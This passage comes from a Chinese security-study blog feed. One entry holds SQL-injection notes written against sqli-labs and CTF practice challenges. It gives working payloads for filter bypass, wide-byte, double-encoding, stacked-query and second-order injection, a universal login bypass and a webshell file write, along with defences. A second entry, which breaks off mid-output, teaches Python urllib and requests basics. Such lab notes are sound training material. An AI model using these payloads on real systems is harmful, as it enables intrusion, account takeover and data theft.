&quot;C:\\www\\sqli\\a.txt&quot; #</code></p><p>这样就将一个一句话木马写入了文件a.txt（注意，还是要有绝对路径和权限才行），这样就可上传一个一句话木马，再拿webshell、</p><h3 id="绕过注释符过滤"><a href="#绕过注释符过滤" class="headerlink" title="绕过注释符过滤"></a>绕过注释符过滤</h3><p>简单的加注释消除报错失败，注释符会被过滤掉，这种时候我们需要使用别的方法来在发现注入点，报错后消除报错，这种时候需要对sql语法的熟练以及一些骚操作整除一些畸形的语句，使其闭合，在课程中讲解人使用的是?id=1’ or(select….) or’这样可以让语句闭合，也需要通过不断的实验以及分析报错的提醒来得到正确的语法</p><p>这里以sqli的less-23作为演示</p><p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39;</code>这样可以得到报错，但我们加#或者–+都无法消除报错，且<code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; %23 a</code>会看到页面上显示的错误是在<strong>a</strong> 附近，没有我们的注释符的影子，这种时候就该考虑注释被过滤掉了，要使用新的方法使其闭合。我们思考这时sql语句<code>select * from aaa where id=&#39;1&#39;&#39; limit 0,1</code> 要消除报错主要是要去掉单引号的影响，这时候用的是or，完整语句是这样的<code>select * from aaa where id=&#39;1&#39; or&#39;&#39; limit 0,1</code>这样可以消除报错，最后是使用两个or在or中间进行注入</p><p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; or (select database()) or&#39;</code>这样不会报错，但显示不出database，使用报错注入</p><p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; or (extractvalue(1,concat(0x7e,database()))) or &#39;</code></p><p>这样就可以得到database了，database换为select就可以得到想要的了，</p><p>对这种微妙也可以使用union select加单引号来进行绕过，也是通过单引号使其闭合</p><h3 id="绕过or-and过滤注入"><a href="#绕过or-and过滤注入" class="headerlink" title="绕过or-and过滤注入"></a>绕过or-and过滤注入</h3><p>我们也可以通过一些报错看到and和or被过滤了，可以先使用大小写试试，不行就换思路，比如使用||来代替or，使用&amp;&amp;来代替and，看哪些不被过滤，所以也就是一些绕过的姿势，以sqli-less-25为例子，<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=1&#39;  %23</code>可以看到这样已经可以消除报错，但是使用orderby时发现会报错，<code> near &#39;der by #&#39;</code>在order前加个a，报错为<code> use near &#39;ader by #&#39;</code>,可以发现or被过滤掉了，这里我们直接用union select就可以解决<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=-1&#39;  union select 1,2,3 %23</code>可以查询，然后再注入就好了，同时，我们也可以使用||来代替or来进行注入，<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=-1&#39;  || (extractvalue(1,concat(0x7e,database()))) %23</code>这样也可以进行注入</p><h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>同样的，可以通过报错可以看到我们在一些语句中空格被过滤掉了，比如我们使用select database(),会报错selectdatabse 不存在报错<code>FUNCTION security.selectextractvalue does not exist</code>，注意空格没了，这时候就考虑时空格绕过，绕过空格我们使用转义来表示空格字符，常用有以下几种，因为系统原因所以需要都进行测试，</p><ul><li>%09 tab键（水平）</li><li>%0a 新建一行</li><li>%0c 新的一页</li><li>%0d return功能</li><li>%0b tab键（垂直）</li><li>%a0 空格</li><li>/**/ 代替空格</li><li>/*!*/ 代替空格</li></ul><p>以sqli-less-26 作为例子</p><p>这是个混合题，过滤了注释和or，所以最后的写法是</p><p><code>http://127.0.0.1:85/sqli-labs/Less-26/?id=1&#39; || (select/*!*/extractvalue(1,concat(0x7e,database()))) || &#39;</code></p><p>虽然这里的报错注入其实用不到select但为了解释空格绕过使用了，也一样，视频里用%a0绕过的，这里不知道为什么不行，最后使用/*!*/ 才绕过了，后续就不查了，一样的。</p><p>做了一下ctfhub的空格绕过，发现第二步使其闭合就卡住了，怎么都不能闭合，但是并没有影响注入。。。因为是过滤空格，所以直接替换空格就行了。。。</p><p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=1/**/order/**/by/**/2</code></p><p>这样就能显示了，</p><p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()</code></p><p>查表</p><p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#39;ppaymrtivl&#39;</code></p><p>查列</p><p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(nalhiirshz)/**/from/**/ppaymrtivl</code></p><p>得到flag，总觉得ctfhub的环境怪怪的，不能闭合还是能继续往下走<del>肯定不是我的问题</del></p><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>这里视频里是用的less-27作为环境，使用内联注释绕过失败了，<del>尴尬</del>但方法得记住，内联注释就是将被过滤掉的语句使用/*!*/包裹起来，比如如果select被过滤掉了则我们使用/*!select*/来进行包裹，可能能绕过过滤，视频里这样不知道为啥失败了，老师使用了另外两种方法，一是大小写，比如写成selEct,以及拼接，在select中再放一个select<code>selselectect</code>这样中间的完整的select被过滤掉以后外层的拼接起来就好了。<del>大概就是这样，不想实验了，累了</del></p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当<strong>MySQL使用GBK</strong>作为编码时会用两个字节作为汉字，有的时候网站会通过<strong>加上反斜杠</strong>来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入。</p><p>以less-33为例子</p><p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1&#39;</code></p><p>加入单引号后没有报错，页面上显示出hint：Hint: The Query String you input is escaped as : 1\‘</p><p>单引号前有一个反斜杠，我们的单引号被过滤掉了，下一行hint：The Query String you input in Hex becomes : 315c27，我们输入的id=1\‘的编码时这么多，我们知道，反斜杠的编码时%5c，如果我们在其之前加入另外的编码使其成为宽字节，就可以去掉反斜杠了，查询GBK的范围，选择一个，%df，这样df5c属于宽字节，加入%df后形成的新字节被MYSQL忽视，反斜杠也没了，这样我们的单引号就又起作用了，具体语法为<code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1%df&#39;</code></p><p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=-1%df&#39; union select 1,2,database() %23</code></p><p>这样已经成功注入了。后续不表</p><p>防范：</p><ul><li>使用utf-8编码</li><li>使用mysqlreal_escape_string.函数，同时使用mysql_set_charset(‘gbk’, $conn);即可防御</li><li>可以设置参数，character_set_client= binary</li></ul><p><strong>对于对单引号的过滤，宽字节无法使用时，可以使用16进制的方式尝试绕过</strong>，比如：</p><pre class="line-numbers language-none"><code class="language-none">union select 1 from aa where name &#x3D;&#39;abc&#39; 如果单引号被过滤那么where后就不能被执行，这时候就将abc转化为16进制，即where name&#x3D;0x616263即可绕过<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>当php中使用了urldecode函数，且放置位置不恰当时，会和php本身的编码配合失误，造成漏洞。当我们输入?id=1’时网站加上反斜杠，但当我们使用二次编码注入就可以绕过，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;%2527，通过php自身编码，%25被转译为&quot;%&quot;，此时为id&#x3D;%27,若使用了urldecode函数，%27被转译为单引号，就不会被加上反斜杠了 %25是&quot;%&quot;，%27是&quot;&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>黑盒测试可以使用id=%2527来测试，白盒可以先看有没有使用urldecode函数，且其使用位置是否合理</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单来说就是在一个语句后面加上分号<code>;</code>,这代表着这一条语句的结束，分号后面继续写别的语句，这样我们写的语句就会和前面的语句一起执行，比如</p><p><code>select * from user where id =1;select * from data</code></p><p>在id后加上一个分号，就可以继续执行下一条。</p><blockquote><p>但是并不是说堆叠注入所有时候都可以用</p><ul><li>可能受到 API或者数据库引擎 不支持的限制，此外，在权限不足的情况也不能成功执行。</li><li>虽然堆叠查询可以执行任意的 sql 语句，但是页面一般只能显示前一条语句执行结果，第二条语句我们无法得知它是否执行成功，第二个语句产生错误或者结果只能被忽略。</li></ul></blockquote><p>和union执行的区别就是union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。比如insert或者delete语句，很多时候我们会在堆叠注入中使用<code>show</code>语句，来查看我们想要的数据，比如 show databases;以及<code>desc</code>命令,用于查看表结构的详细信息，比如 desc flag;**有的时候desc后的值需要使用反引号包裹。</p><p>这里记录[[强网杯 2019]随便注 1]的一道题目writeup</p><p>使用的就是堆叠注入以及一些骚操作<strong>其实主要是我对sql语句并不熟练，只会一些最基本的</strong>，来看一下这一题</p><p>使用单引号，报错，加–+消除成功，order by，但union的时候返回了select被过滤的情况，怎么也绕不过去，看到使用?inject=1’ or 1=1 #可以看到更多的信息，接下来使用堆叠注入，首先inject=1’;show databases;可以看到数据库，show tables；看到两张表</p><p><img src="/images/image-20201008193146206.png" alt="两张表"></p><p>使用 desc分别查看，</p><p>?inject=1’;desc words;</p><p>?inject=1’;desc `1919810931114514`;（这里需要打反引号）</p><p>可以看到flag在数字的这个表里，接下来的就是一些奇异的思路了。通过修改表名和字段名来获取flag，我们可以看到我们只有两个表，一个是words一个是数字的那个，观察当看words的具体内容和最开始的查询</p><p><img src="/images/image-20201008194047954.png" alt="2"></p><p>我们可以猜测正常的时候我们是在查words表里的id，data字段，我们将数字表改为words表，将flag字段改为id字段，就可以查出flag值了，直接给出构造的payload：</p><p>?inject=1’;rename table words to words1;rename table `19198109311145` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</p><p>rename table `words` to `www`;rename table `1919810931114514`  to `words`;alter table words change flag id varchar(100);#</p><p>注意，下面这一行rename时每一个表名都加了反引号，我这里好像要这样才能改表名称，不然会显示words表不存在，以后最好还是都加上；最后用一个 ？inject=1’ or 1=1 –+就可以找到flag了；</p><p>记录一下rename和alter函数。</p><pre class="line-numbers language-none"><code class="language-none">rename命令格式：rename table 原表名 to 新表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">如需在表中添加列，请使用下面的语法:ALTER TABLE table_name ADD column_name datatype如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：ALTER TABLE table_name DROP COLUMN column_name改变列的名称alter table table_name change a b integer(这个是数据类型，可以是varchar);要改变表中列的数据类型，请使用下面的语法：SQL Server &#x2F; MS Access：ALTER TABLE table_name ALTER COLUMN column_name datatypeMy SQL &#x2F; Oracle：ALTER TABLE table_name MODIFY COLUMN column_name datatypeOracle 10G 之后版本:ALTER TABLE table_name MODIFY column_name datatype;flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>记录一道题的解法，是[极客大挑战 2019]EasySQL的题目，</p><p>登录后发现是get型传递参数，加单引号报错，可以看到是字符型，这里使用了一种<strong>万能密码</strong></p><p><code>http://f8759e96-bef7-4955-bd4e-371420693b66.node3.buuoj.cn/check.php?username=admin&#39;or &#39;1&#39;=&#39;1&amp;password=admin&#39;or &#39;1&#39;=&#39;1</code></p><p>首先使用一个单引号使用户名闭合，这时会判断我们的用户名是错的，然后执行or后面的语句，’1’=’1’成立，密码也这样，就能够登录了。    </p><hr><p>最后简单记录一下sql注入防御手段，</p><ul><li>代码层<ul><li>黑名单（某些字符进入黑名单）</li><li>白名单（比黑名单好）</li><li>敏感字符过滤</li><li>使用框架安全查询</li><li>规范输出</li></ul></li><li>配置层<ul><li>开启GPC</li><li>使用UTF-8</li></ul></li><li>物理层<ul><li>WAF</li><li>数据库审计</li><li>云防护</li><li>IPS（入侵防御系统）</li></ul></li></ul><p><strong><em>小结一下，这些都只是最最基础的，在实际的题目中会有很多的骚操作，比如过滤掉逗号，过滤掉括号，需要大量的经验和骚操作，所以任重道远，需要未来更多的实践和学习，<del>这些是人学的东西，又多又杂，淦</del>比如过滤了逗号我们使用括号吧要用的括起来。</em></strong></p><h2 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h2><p>上述描述了部分实际使用中的sql注入的方法，现在记录进行完整的sql注入的流程和其中需要注意的地方。</p><p>可以将sql注入分为三个步骤：<strong>信息收集，数据获取，提权。</strong></p><ul><li>信息搜集：<ul><li>数据库类型<ul><li>通过报错等可以找到</li></ul></li><li>数据库版本<ul><li>version(),@@version,v$version</li></ul></li><li>数据库用户<ul><li>user(),SYSTEM_USER</li></ul></li><li>数据库权限<ul><li>super_priv,IS_SRVROLEMEMBER</li></ul></li></ul></li><li>获取信息<ul><li>获取库信息</li><li>获取表信息</li><li>获取列信息</li><li>获取数据</li><li>通过语句查询，或者暴力破解（access通过暴力破解来判断有哪些表）</li></ul></li><li>提权<ul><li>执行命令（比如SQLServer sa权限）</li><li>读文件（读中间配置文件，读数据库配置文件）</li><li>写文件（写webshell到网站目录</li></ul></li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入的原理是：虽然开发者对sql语句进行了过滤，比如在查询时，将<code>id=1&#39;</code>中单单引号进行转译，转化成了<code>id=1\&#39;</code>进行执行，如果将其这个数据存储到数据库中却是存储的原来的数据即<code>id=1&#39;</code>，开发者如果将已经在数据库中单信息视作安全，在后续调用该参数的时候没有再进行过滤转译，导致在读取时造成了注入，这就是二次注入点原理，这里以sql-labs-24为例做一个演示</p><p>这一关的想法是通过二次注入来修改正常用户的密码，在开始时会进行用户注册，注册成功后登录该用户会要求该用户修改密码：</p><p>首先注册一个test用户，密码test</p><p><img src="/images/image-20210802142726344.png"></p><p>再注册一个test’ #用户，密码为123：</p><p>注意，此时sql语句中username被转义，是test\‘ #,但保存到数据库中的username却是test&#39; #</p><p>登录test&#39; #修改密码为aaa</p><p><img src="/images/image-20210802142837143.png"></p><p>在数据库中可以看到</p><p><img src="/images/image-20210802143229400.png"></p><p>可以看到，密码被修改的是用户test而不是test&#39; #，这样我们就完成了对test用户账号的窃取</p><p>看一下修改密码的源代码：</p><p><img src="/images/image-20210802143504306.png"></p><p>可以看见，在进行update时并没有进行过滤以及转义。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语句中$username现在是test’ #，则现在的语句为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='test' #'and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span class="token comment">#有效语句为：</span><span class="token variable">$sql</span> <span class="token operator">=</span> "<span class="token constant">UPDATE</span> users <span class="token constant">SET</span> <span class="token constant">PASSWORD</span><span class="token operator">=</span><span class="token string single-quoted-string">'$pass'</span> where username<span class="token operator">=</span><span class="token string single-quoted-string">'test'</span>这里直接就会将test用户的密码进行更改，实现了二次注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>防御：在对sql语句进行过滤以及转义时，除了要小心各个普通的查询和注入点，已经存入数据库的数据在进行取用时也需要进行过滤以及转义，防止二次注入的产生。</li></ul><h3 id="waf的绕过"><a href="#waf的绕过" class="headerlink" title="waf的绕过"></a>waf的绕过</h3><p>对于sql注入来说，在进行真实的渗透测试时，遇见waf才是绝大多数情况。如何绕过waf是我们需要进行掌握和熟练的。</p><p>从大的方面来说，在进行黑盒测试有如下的绕过原理：</p><ol><li>架构层绕过WAF<ol><li>寻找源站→针对云WAF</li><li>利用同网断→绕过WAF防护区域</li><li>利用边界漏洞→绕过WAF防护区域</li></ol></li><li>利用边界漏洞→绕过WAF防护区域<ol><li>POST大BODY协议层面绕过WAF的检测</li></ol></li><li>协议未覆盖绕过waf<ol><li>请求方式变换：GET→POST Content-Typesta：application/x-www-form-urlencoded；multipart/form-data；</li><li>参数污染</li></ol></li><li>规则层面的绕过（主要的绕过方式）（以sql注入为例）</li></ol><p><img src="/images/image-20210804165557793.png"></p><p>在知道原理后该如何进行绕过呢？那就是通过fuzz进行绕过，fuzz，模糊测试，<strong>在这里简单来说就是对于这些可能成功的绕过方法进行自动化或者半自动化的测试</strong>，例如：</p><p><img src="/images/image-20210804165821212.png"></p><p>对于空白字符进行的过滤通过脚本或者burp等工具进行不断的测试，直到绕过，接下来在遇到新的防护规则时又继续fuzz</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫基础库的使用</title>
      <link href="/2020/09/15/ji-chu-ku-de-shi-yong/"/>
      <url>/2020/09/15/ji-chu-ku-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫基础库使用"><a href="#爬虫基础库使用" class="headerlink" title="爬虫基础库使用"></a>爬虫基础库使用</h1><p>将对一些爬虫会使用到的基础库进行一定的记录</p><h3 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h3><p>用于实现请求的发送</p><p>一般有三个库被使用</p><ul><li>request：用于发送请求</li><li>parse：用于URL的处理</li><li>error：异常处理</li></ul><h4 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h4><p>​    urllib.request模块提供最基本构造HTTP请求功能</p><ul><li>urlopen</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestresponse <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://119.23.18.158"</span><span class="token punctuation">)</span><span class="token comment">#使用urlopen来模拟打开网页</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输出后可以看到该页面源码</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheader<span class="token punctuation">(</span><span class="token string">'server'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>debuglevel<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用一些该类型对象的方法或者属性可以查看更多的信息</p><p>如果想传递一些参数，可以查看urlopen的api，</p><p>比如参数<strong>data</strong>可用于POST型的传递参数</p><p>参数<strong>timeout</strong>用于响应时长（即多久没有得到服务器响应就报错）</p><p>这里可以使用timeout以及error模块来进行报错处理</p><ul><li>Request</li></ul><p>URLopen可以简单的实现请求的发起，但如果要使用更复杂的请求就需要使用Request<strong>类</strong>（比如加入header）</p><p>比如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">request1<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">'http://119.23.18.158'</span><span class="token punctuation">)</span><span class="token comment">#Request类的实例化</span>response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request1<span class="token punctuation">)</span><span class="token comment">#这样也就可以实现请求</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看一下Request的构造方法：</p><p><code>class urllib. request. Request ( url, data=None, headers=&#123;&#125;, origin_req_host=None, unverifiable=False, method=None)</code></p><ul><li><p>除了第一个url其它都是可选参数</p></li><li><p>第二个参数 data 如果要传，必须传 bytes（字节流）类型的 如果它是字典，可以先用<br>urllib.parse 模块里的 urlencode （）编码</p></li><li><p>第 个参数 headers 是一个字典，它就是请求头，我们可以在构造请求时通过 headers 参数直<br>接构造，也可以通过调用请求实例的 add_header （）方法添加</p><p>添加请求头最常用的用法就是通过修改 <strong>User-Agent</strong> 来伪装浏览器，默认的 User-Agent 一－<br>Python-urllib ，我们可以通过修改它来伪装浏览器 比如要伪装火狐浏览器，你可以把它设 置为</p><p>Mozilla/s.o (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11 </p></li><li><p>第四个参数 origin_req_host 指的是请求方的 host 名称或者 IP 地址</p></li><li><p>第五个参数 nveri iable 表示这个请求是否是无法验证的，默认是 False ，意思就是说用户没<br>有足够权限来选择接收这个请求的结果 例如，我们请求 HTML 文档中的图片，但是我<br>们没有向动抓取图像的权限，这时 unverifiable 的值就是 True</p></li><li><p>第六个参数 method 一个字符串 ，用来指示请求使用的方法，比如 GET POST PUT</p></li></ul><p>构建多个参数如下图所示</p><p><img src="/images/image-20201006213955870.png" alt="多参数request"></p><h4 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h4><p>一些高级请求如cookie请求的构造需要用到Handler了，handler是urllib中request模块中的一组类，BaseHandler是所有Handler的父类，其它的子类有其更细的公能：</p><p><img src="/images/image-20201007222340342.png" alt="image-20201007222340342"></p><p>这里还有一个OpenerDirector类比较重要，与之前的urlopen类似，而在这里我们用handler来构建opener</p><ul><li>有的时候我们会遇见用js写的验证，需要验证用户名和密码</li></ul><p><img src="/images/image-20201008132558790.png" alt="验证"></p><p>使用HTTPBasicAuthHandler就可以完成</p><p><img src="/images/image-20201008132730496.png" alt="HTTPBasicAuthHandler"></p><p>填写username等信息后先初始化一个HTTPasswordMgrWithDefaultRealm对象，再实例化HTTPBasicAuthHandler对象，以之前的HTTPasswordMgrWithDefaultRealm对象为参数，这样就建立了一个处理验证的handler。</p><p>接下来用这个handler使用build_opener来构造一个opener，再用opener调用open就可以打开链接完成验证了</p><ul><li>代理</li></ul><p><img src="/images/image-20201008140451321.png" alt="代理"></p><ul><li>cookie</li></ul><p>处理cookie的时候也会使用到handler</p><p><img src="/images/image-20201008141131451.png" alt="cookie"></p><p>如果想要将cookie储存为文本文件，只需要将CookieJar换为MozillarCookieJar（是CookieJar的子类）用来处理与cookie相关的文件相关事件</p><p><img src="/images/image-20201008141331840.png" alt="image-20201008141331840"></p><p>LWPCookieJar也可以保存读取cookie但格式为LWP，声明时按需选取即可</p><p>当我们需要使用被存储的cookie时，</p><p><img src="/images/image-20201008142622747.png" alt="取cookie"></p><ul><li>异常处理</li></ul><p>urllib 的error模块会处理由调用request模块产生的异常</p><ol><li>URLError</li></ol><p>由request调用产生的异常都可以使用URLError来解决</p><ol start="2"><li>HTTPError</li></ol><p>是URLError的子类，专门处理http请求错误的error，比如认证请求失败，有三个属性</p><p><img src="/images/image-20201008143421627.png" alt="HTTPError"></p><p><img src="/images/image-20201008143502701.png" alt="实例1"></p><p><img src="/images/image-20201008143534005.png" alt="实例2"></p><h4 id="解析链接"><a href="#解析链接" class="headerlink" title="解析链接"></a>解析链接</h4><p>urllib库中的parse模块定义了处理URL的标准接口，可以实现URL的抽取合并以及链接转换</p><ol><li>urlparse</li></ol><p>可以实现url的识别和分段，下面看一段代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparseresult <span class="token operator">=</span> urlparse<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com/index.html;user?id=4#comment'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到结果</p><pre class="line-numbers language-none"><code class="language-none">&lt;class &#39;urllib.parse.ParseResult&#39;&gt; ParseResult(scheme&#x3D;&#39;https&#39;, netloc&#x3D;&#39;www.baidu.com&#39;, path&#x3D;&#39;&#x2F;index.html&#39;, params&#x3D;&#39;user&#39;, query&#x3D;&#39;id&#x3D;4&#39;, fragment&#x3D;&#39;comment&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20201008150846179.png" alt="urlparse"></p><p><img src="/images/image-20201008151833433.png" alt="参数"></p><p><img src="/images/image-20201008151931365.png" alt="image-20201008151931365"></p><ol start="2"><li>urlunparse</li></ol><p>与urlparse对应，参数是一个可迭代对象，长度必须为6，</p><p><img src="/images/image-20201008152606176.png" alt="urlunparse"></p><p>运行结果为</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.baidu.com&#x2F;index.html;user?id&#x3D;4#comment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>urlsplit</li></ol><p>和urlparse很类似，只是少了一个参数，不再单独解析params，放入了path中</p><ol start="4"><li>urlunsplit</li></ol><p>类似urlunparse</p><p><del><strong><em>记录到这里我有点迷茫，这些其实在真的爬虫中都是用不到的东西，urllib库里的东西基本都被requests库里的替代了，那我费这么长的时间学有啥用呢，我悟了，urllib看看就行，爬虫只是一个工具，不搞原理的东西了，能写出来就行,从这里停止记录</em></strong></del></p><ol start="5"><li>用于get请求构造序列化以及反序列化的分别为：</li></ol><p>urlencode()</p><p>parse_qs(),parse_qsl()</p><p>具体不表</p><ol start="6"><li>queote()</li></ol><p>将内容转换为url编码格式</p><ol start="7"><li>unquote()</li></ol><p>URL格式解码</p><h4 id="robot协议"><a href="#robot协议" class="headerlink" title="robot协议"></a>robot协议</h4><ol><li>robot协议决定了网站哪些页面允许爬虫爬取，哪些不允许，一般是由robot.txt文件来管理，放在网站根目录下或者和index页面放在一起，robot.txt一般写法如下：</li></ol><p><img src="/images/image-20201010164826608.png" alt="robot"></p><p>这里的意思是所有都不允许，只允许/public/文件夹下的</p><ol start="2"><li>urllib使用robotparser模块对robot.txt进行解析</li></ol><p>主要使用了RobotFileParser类，</p><p><img src="/images/image-20201010165305904.png" alt="RobotFileParser"></p><p><img src="/images/image-20201010165407373.png" alt="实例"></p><h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p>一般来说urllib使用并不多，而requests库的使用时很多的，这是一个强大的库，我们可以依靠他完成很多操作</p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><ol><li>GET请求</li></ol><p>构建get请求:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.baidu.com/'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过get来发起get请求，获得了返回值r，可以对r进行一系列操作</p><p><img src="/images/image-20201010175357068.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.httpbin.org/get'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>相应结果为：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;args&quot;: &#123;&#125;,   &quot;headers&quot;: &#123;    &quot;Accept&quot;: &quot;*&#x2F;*&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,     &quot;Host&quot;: &quot;www.httpbin.org&quot;,     &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.22.0&quot;,     &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f8184fe-31632cd76578202c2104fe09&quot;  &#125;,   &quot;origin&quot;: 